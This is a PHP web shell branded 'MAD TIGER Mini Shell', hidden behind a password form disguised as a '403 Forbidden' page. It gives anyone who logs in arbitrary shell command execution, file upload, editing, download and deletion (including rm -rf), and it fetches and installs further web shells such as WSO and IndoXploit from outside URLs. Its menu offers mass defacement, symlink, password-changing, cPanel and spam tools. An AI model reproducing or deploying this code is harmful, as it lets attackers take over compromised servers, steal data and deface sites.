<?php
// Start a session
session_start();

// Check if the user is already logged in
if (isset($_SESSION['loggedin']) && $_SESSION['loggedin'] === true) {
    // User is already logged in, so display the PHP code
    
/*
@ PHPWebshell - MAD TIGER Mini Shell.
@ mooded by : MAD TIGER
@ Contact : madtiger.bghh@gmail.com
eval("?>".file_get_contents("https://www.0xmad.me/files/tools.txt"));
*/
error_reporting(0);
set_time_limit(0);
header("X-XSS-Protection: 0");

$are=array("adminer"=>"https://raw.githubusercontent.com/khayrol/tools/master/adminer-4.7.6-en.php",
			"indoexploit"=>"https://raw.githubusercontent.com/khayrol/tools/master/h.php",
			"log"=>"https://raw.githubusercontent.com/khayrol/tools/master/log.php",
			"wso"=>"https://raw.githubusercontent.com/alintamvanz/webshell/master/ext/wso.php",
			"mina1"=>"https://raw.githubusercontent.com/khayrol/tools/master/live.php",
			"jquery" => "https://alintamvanz.github.io/jshell/jquery.min.js");

function getpath()
{
	if(isset($_GET['d']))
	{
		$d=$_GET['d'];
	}else{
		$d=getcwd();
	}
	return $d;
}
function cmd($cmd){ if(function_exists('system')) { @ob_start(); @system($cmd); $buff = @ob_get_contents();@ob_end_clean(); return $buff; 	} elseif(function_exists('exec')) { @exec($cmd,$results); $buff = ""; foreach($results as $result) { $buff .= $result; } return $buff; 	} elseif(function_exists('passthru')) { @ob_start(); @passthru($cmd); $buff = @ob_get_contents(); @ob_end_clean(); return $buff; 	} elseif(function_exists('shell_exec')) { $buff = @shell_exec($cmd); return $buff; }}
function delete($dir){if(is_dir($dir)){if(!rmdir($dir)){$s=scandir($dir);foreach ($s as $ss) {if(is_file($dir."/".$ss)){if(unlink($dir."/".$ss)){$rm=rmdir($dir);}}if(is_dir($dir."/".$ss)){$rm=rmdir($dir."/".$ss);$rm.=rmdir($dir);$rm.=system('rm -rf '.$dir);}}}}elseif(is_file($dir)){$rm = unlink($dir);if(!$rm){system('rm -rf '.$dir);}}return $rm;}
function getowner($path){if(function_exists('posix_getpwuid')) {$downer = @posix_getpwuid(fileowner($path));$downer = $downer['name'];} else {$downer = fileowner($path);}return $downer;}
function getgroup($path){if(function_exists('posix_getgrgid')) {$dgrp = @posix_getgrgid(filegroup($path));$dgrp = $dgrp['name'];} else { $dgrp = filegroup($path);}return $dgrp;}
function upload($a,$b){ if(function_exists('move_uploaded_file')){$upl = move_uploaded_file($a,$b);}elseif (function_exists('copy')) {  $upl = copy($a,$b);}return $upl; }function array_upload($file){ $file_ary = array(); $file_count = count($file['name']); $file_key = array_keys($file); for($i=0;$i<$file_count;$i++) { foreach($file_key as $val) { $file_ary[$i][$val] = $file[$val][$i]; } } return $file_ary;}
function sedirs($dir)
{
	if(function_exists('scandir'))
	{
		$s=scandir($dir);
		chdir($dir);
	}else{
		$s=system($dir);
	}
	return $s;
}
function getperms($files)
{
		if($s_m = @fileperms($files)){
		$s_p = 'u';
		if(($s_m & 0xC000) == 0xC000)$s_p = 's';
		elseif(($s_m & 0xA000) == 0xA000)$s_p = 'l';
		elseif(($s_m & 0x8000) == 0x8000)$s_p = '-';
		elseif(($s_m & 0x6000) == 0x6000)$s_p = 'b';
		elseif(($s_m & 0x4000) == 0x4000)$s_p = 'd';
		elseif(($s_m & 0x2000) == 0x2000)$s_p = 'c';
		elseif(($s_m & 0x1000) == 0x1000)$s_p = 'p';
		$s_p .= ($s_m & 00400)? 'r':'-';
		$s_p .= ($s_m & 00200)? 'w':'-';
		$s_p .= ($s_m & 00100)? 'x':'-';
		$s_p .= ($s_m & 00040)? 'r':'-';
		$s_p .= ($s_m & 00020)? 'w':'-';
		$s_p .= ($s_m & 00010)? 'x':'-';
		$s_p .= ($s_m & 00004)? 'r':'-';
		$s_p .= ($s_m & 00002)? 'w':'-';
		$s_p .= ($s_m & 00001)? 'x':'-';
		return $s_p;
	}
	else return "???????????";
}
function downloads($file)
{
	@ob_clean();
	header('Content-Description: File Transfer');
	header('Content-Type: application/octet-stream');
	header('Content-Disposition: attachment; filename="'.basename($file).'"');
	header('Expires: 0');header('Cache-Control: must-revalidate');
	header('Pragma: public');
	header('Content-Length: ' . filesize($file));
	readfile($file);
	exit;
}
function viewfilefunc($file)
{
	echo "<center><h1> View : ".basename($file)."</h1>";
	echo "<textarea readonly>";
	echo htmlspecialchars(file_get_contents($file));
	echo "</textarea></center>";
}
function ts($s_s){
	if($s_s<=0) return 0;
	$s_w = array('B','KB','MB','GB','TB','PB','EB','ZB','YB');
	$s_e = floor(log($s_s)/log(1024));
	return sprintf('%.2f '.$s_w[$s_e], ($s_s/pow(1024, floor($s_e))));
}
function getsize($s_f){
	$s_s = @filesize($s_f);
	if($s_s !== false){
		if($s_s<=0) return 0;
		return ts($s_s);
	}
	else return "???";
}
function kuchiyose($a,$b)
{
	$fgc=file_get_contents($a);
	$fp=fopen($b.".shell.php",'w');
	fwrite($fp,$fgc);
	fclose($fp);
}
function cekk($f){
	if(file_exists($f.".shell.php")){
		echo "<b>Request done ! <a href='$f.shell.php' target='_blank'>Click here</a>";
	}
}
function renamefunc($dir,$oldname){
	echo "<center><h1>Rename : ".$oldname."</h1><br><form method='POST' class='in'>oldname : <input type='text' value='$oldname' class='in' readonly>";
	echo "Newname : <input type='text' name='newname' value='newname' class='in'><input type='submit' value='>>' name='s'></form></center>";
	if(isset($_POST['s'])){
		rename($dir."/".$oldname,$dir."/".$_POST['newname']);
		echo "<meta http-equiv='refresh' content='0;url=?d=".dirname($dir)."'>";
	}
}
function editfunc($dir,$file){
	echo "<center><h1> Edit : ".$file."</h1><br><form method='POST'>";
	echo "<textarea name='editfile'>".htmlspecialchars(file_get_contents($dir."/".$file))."</textarea><br>";
	echo "<input type='submit' name='sbmt' value='>>submit<<' style='width:200px;'>";
	echo "</form>";
	if(isset($_POST['sbmt']))
	{
		$fp=fopen($dir."/".$file,'w');
		fwrite($fp,$_POST['editfile']);
		fclose($fp);
		echo "<br><b>Tersimpan @".date('D ,d m Y')."</b><br>";
	}
}
function berinamafunc($dir){
	echo "<center><h1>New file </h1><br><form method='POST' class='in'>";
	echo "Filename : <input type='text' name='filename' value='newfile.php'>";
	echo "<input type='submit' name='svi' value='>>'>";
	echo "</form>";
	if(isset($_POST['svi']))
	{
		if(function_exists('touch')){
			touch($dir."/".$_POST['filename']);
		}else{
			$fp=fopen($dir."/".$_POST['filename'],'w');
			fwrite($fp,'#new file 1945');
			fclose($fp);
		}
		header('location:?d='.$dir.'&a=edit&f='.$_POST['filename']);
	}
}
function mkdirfunc($dir){
	echo "<center><h1>New directory</h1>";
	echo "<form method='POST' class='in'>New dir:<input type='text' name='mkdir'>";
	echo "<input type='submit' name='sbmt' value='>>'></form></center>";
	if(isset($_POST['sbmt']))
	{
		mkdir($dir."/".$_POST['mkdir']);
		echo "<meta http-equiv='refresh' content='0;url=?d=".$dir."'>";
	}

}
$gp=getpath();
?>
<!DOCTYPE html>
<html>
<head>
	<title>[+[MAD TIGER]+]</title>
<meta name="author" content="mad tiger">
<link rel="icon" type="text/css" href="http://banglagamer.com/attachment.php?attachmentid=4386&d=1281605974">
<script type="text/javascript" src="<?=$are['jquery'];?>"></script>
</head>
<style type="text/css">
	body{background:black;color:black}
	.table{border: 1px solid #f00;width:1000px;border-collapse: collapse;}
	.table tr{border-bottom: 1px solid #fff}a{text-decoration: none;color:#eee;}a:hover{color: #f00}.table tr:hover{background:#666}hr{border: 1px solid #f00}.in{display: inline-block;margin-left:10px;margin-right:10px}select,option,input,textarea{background:#333;color:#eee;border: 1px solid #f00}textarea{width:700px;height: 500px;margin: 0 auto;}
</style>
<body>
<audio autoplay="true" src="https://s114.123apps.com/aconv/d/s114DIJQS3jL_mp3_DsJqP8E9.mp3"></audio>
<center>
<a href="<?=$_SERVER['PHP_SELF'];?>"><center><font color=green><h1>..::MAD TIGER::..</h1></center></a>
</HEAD>
<h5>ICQ(@747634197)</h5>
<BODY><center>
<a href="?mad=domain">Domain Viewer</a>|<a href="?mad=server-mailer"> Mail checker</a>|
<a href="?mad=mass"> Mass Deface </a>
<a href="?mad=smtp">| SMTP</a>
<a href="https://www.google.com/search?q=HACKED+BY+MAD+TIGER">Who Am I?</a><br><a href="?mad=symlink"> Symlink </a>|
<a href="?mad=sm">Mass Pass CNG</a>|
<a href="?mad=re">Resheller user</a>|
<a href="?mad=cpanel">cPanel</a>|
<a href="?mad=spam"> inbox </a></center>
<a href="?mad=zone-h"> Zone-h post </a><br></center>
<center>
<table width="700" border="3" cellpadding="3" cellspacing="1" align="center" color="green">
[<font color=green><?=php_uname();?></font>]</center><center>
<hr><div class="in">
<form class="in" method="get">Tools are here : 
	<select name="a" onchange="this.form.submit();">
		<option value="">select</option>
		<option value="wso">WSO 2.5</option><option value="indoexploit">IndoXploit</option><option value="log">Dhanus</option><option value="mina1">cmd_shell</option><option value="adminer">Adminer</option>
	</select>
</form>
<form method="post" class="in" enctype="multipart/form-data" action="?d=<?=$gp;?>&a=upload"> Upload file :<input type="file" name="filup[]" multiple="" style="border: 0"><input type="submit" name="upload" value=">>"></form><form method="post" action="?d=<?=$gp;?>&a=cmd" class="in"> Command : <input type="text" name="cmd"></form>
<form method=get class="in">go to dir : <input type="text" name="d" value="<?=$gp;?>"><input type="submit" value=">>"></form><form method="get" class="in"><select name="a" onchange="this.form.submit();"><option>---</option><option value="logout">LogOut</option><option value="kill">Kill Self</option><option value="shell"></option></select></form>
</div>
<hr>
</center>
<?php
echo"Grab Domain For==>";
$srvr_ip=$_SERVER['SERVER_ADDR'];
echo"<a href='https://api.hackertarget.com/reverseiplookup/?q=$srvr_ip'>Grab Domain For,$srvr_ip</a>";
if(isset($_GET['path'])){
$path = $_GET['path'];
}else{
$path = getcwd();
}
$path = str_replace('\\','/',$path);
$paths = explode('/',$path);

foreach($paths as $id=>$pat){
if($pat == '' && $id == 0){
$a = true;
echo '<a href="?d=/">/</a>';
continue;
}
if($pat == '') continue;
echo '<a href="?d=';
for($i=0;$i<=$id;$i++){
echo "$paths[$i]";
if($i != $id) echo "/";
}
echo '">'.$pat.'</a>/';
}

					
?>

						
<?php
if(empty($_GET['a']))
{
	?>
<table align="center" class="table">
	<th>Files</th><th>Size</th><th>owner:group</th><th>Permission</th><th>Action</th>
<?php
$dir=sedirs(getpath());
echo "<tr><td><a href=\"?d=".dirname($gp)."\">Current dir</a></td><td>--</td><td>--</td><td>--</td><td align=right><a href='?d=$gp&a=touch'>Newfile</a> | <a href='?d=$gp&a=mkdir'>newdir</a></td></tr>";
foreach($dir as $d1)
{if(!is_dir("$gp/$d1")||$d1=="."||$d1=="..")continue;
	?>
	<tr><td>[<a href="?d=<?="$gp/$d1"?>"><?=$d1;?></a>]</td>
	<td><?=getsize("$gp/$d1");?></td>
	<td><?=getowner("$gp/$f1");?>:<?=getgroup("$gp/$f1");?></td>
	<td><?=getperms("$gp/$d1");?></td>
	<td align="right"><a href="?d=<?="$gp/$d1"?>&a=rename">Rename</a> | <a href="?d=<?="$gp/$d1"?>&a=delete">Delete</a></td>
	</tr>
	<?php
}
foreach($dir as $f1)
{
	if(!is_file("$gp/$f1")||$f1=="."||$f1=="..")continue;
?>
	<tr><td><a href="?d=<?=$gp;?>&a=view&f=<?=$f1;?>"><?=$f1;?></a></td>
	<td><?=getsize("$gp/$f1");?></td>
	<td><?=getowner("$gp/$f1");?>:<?=getgroup("$gp/$f1");?></td>
	<td><?=getperms("$gp/$f1");?></td>
	<td align="right">
	<a href="?d=<?=$gp;?>&a=rename&f=<?=$f1;?>">Rename</a> |
	<a href="?d=<?="$gp/$f1";?>&a=delete">delete</a> |
	<a href="?d=<?=$gp;?>&a=edit&f=<?=$f1;?>">edit</a> |
	<a href="?d=<?=$gp;?>&a=download&f=<?=$f1;?>">download</a></td>
	</tr>
	<?php
}
?>
</table>
<?php
}else{
@$a=$_GET['a'];
@$f=$_GET['f'];
@$d=$_GET['d'];
if($a=="view")
{viewfilefunc($d."/".$f);}elseif($a=="download"){downloads($d."/".$f);}
elseif($a=="logout"){if(setcookie(md5($_SERVER['HTTP_HOST']),""))
	echo "<script>alert('See You Next time !');window.location.href='????'</script>";}
elseif($a=="cmd"){
	echo "<center><h1> Command</h1></center>";
	?><form method="post" action="?d=<?=$gp;?>&a=cmd" class="in"> Command : <input type="text" name="cmd"><input type="submit" value=">>"></form><?php
	echo "<pre>".cmd($_POST['cmd'])."</pre>";
}
elseif($a=="rename"){$ff=(isset($_GET['f']) ? $_GET['f'] : basename($_GET['d']));$gdd=(isset($_GET['f'])) ? $_GET['d'] : dirname($_GET['d']); renamefunc($gdd,$ff);}
elseif($a=="delete"){delete($_GET['d']);echo "<meta http-equiv='refresh' content='0;url=?d=".dirname($_GET['d'])."'>";}
elseif($a=="upload"){
	$fil=array_upload($_FILES['filup']); foreach($fil as $filup)
	{
		$filoc=$d."/".$filup['name'];
		if(upload($filup['tmp_name'],$filoc))
		{
			echo "<font color=lime>Successfully upload -> <a href='?d=".$d."&a=view&f=".$filup['name']."'>".$filoc."</a></font><br>";
		}else{
			echo "<font color=red>Failed upload -> ".$filoc."</font><br>";
		}
	}
}
elseif($a=="mkdir"){mkdirfunc($d);}
elseif($a=="touch"){berinamafunc($d);}
elseif($a=="edit"){editfunc($_GET['d'],$_GET['f']);}
elseif($a=="indoexploit"){kuchiyose($are['indoexploit'],"indoxploit");cekk("indoxploit");}
elseif($a=="wso"){kuchiyose($are['wso'],"wso");cekk("wso");}
elseif($a=="log"){kuchiyose($are['log'],"log");cekk("log");}
elseif($a=="adminer"){kuchiyose($are['adminer'],"adminer");cekk("adminer");}
elseif($a=="mina1"){kuchiyose($are['mina1'],"mina1");cekk("mina1");}
}


} elseif (isset($_COOKIE['loggedin']) && $_COOKIE['loggedin'] === true) {
    // If a login cookie is set, set the session variable to remember the login state
    $_SESSION['loggedin'] = true;
} elseif (isset($_POST['password'])) {
    // Check if the form has been submitted
    $enteredPassword = $_POST['password'];

    // Define the correct password hash (MD5)
    $correctPasswordHash = "9de37a0627c25684fdd519ca84073e34"; // Replace with the MD5 hash of your password

    // Calculate the MD5 hash of the entered password
    $enteredPasswordHash = md5($enteredPassword);

    // Check if the entered password hash matches the correct password hash
    if ($enteredPasswordHash === $correctPasswordHash) {
        // Password is correct, set the login state in the session and create a login cookie
        $_SESSION['loggedin'] = true;
        setcookie('loggedin', true, time() + 3600); // Cookie expires in 1 hour

        // Display the PHP code


    } else {
        // Password is incorrect, display an error message
        echo "Incorrect password. Please try again.";
    }
}
?>

<!DOCTYPE html>
<html>
<head>
    <title>403 Forbidden</title>
</head>
<body>
    <form method="POST">
        <label for="password">Enter Password:</label>
        <input type="password" id="password" name="password">
        <input type="submit" value="Login">
    </form>
</body>
</html>
